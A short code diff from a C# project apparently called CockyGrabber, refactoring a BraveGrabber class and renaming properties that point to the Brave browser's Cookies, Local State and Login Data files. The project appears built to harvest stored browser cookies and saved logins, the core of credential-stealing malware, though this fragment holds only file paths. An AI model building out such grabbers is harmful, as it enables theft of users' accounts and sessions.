@@ -2,23 +2,23 @@
 
 namespace CockyGrabber.Grabbers
 {
-    public class BraveGrabber : ChromiumGrabber
+    public class BraveGrabber : BlinkGrabber
     {
-        public override string ChromiumBrowserCookiePath
+        public override string CookiePath
         {
             get
             {
                 return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies";
             }
         }
-        public override string ChromiumBrowserLocalStatePath
+        public override string LocalStatePath
         {
             get
             {
                 return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
             }
         }
-        public override string ChromiumBrowserLoginDataPath
+        public override string LoginDataPath
         {
             get
             {
